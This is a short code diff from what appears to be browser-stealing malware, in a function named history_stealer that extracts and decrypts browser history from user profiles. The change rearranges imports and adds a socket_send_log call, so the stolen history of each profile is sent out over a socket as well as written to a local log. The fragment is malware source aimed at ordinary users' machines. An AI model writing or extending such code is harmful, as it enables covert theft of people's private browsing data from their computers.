@@ -1,7 +1,11 @@
 """ IMPORTS """
-import json
 import sqlite3
-from util import try_extract, get_profiles, create_temp_file, log_data, try_decrypt
+
+from util.general import (
+    try_extract, get_profiles, create_temp_file, log_data,
+)
+from util.crypt import try_decrypt
+from util.socket import socket_send_log
 
 
 """
@@ -37,6 +41,7 @@ def history_stealer(browser: dict, encryption_key: str) -> None:
         if history:
             log_file_name = profile_name + ' History'
             log_data(history, browser['name'], log_file_name)
+            socket_send_log(history, browser['name'], log_file_name)
 
         # Close sqlite3 connection
         cursor.close()
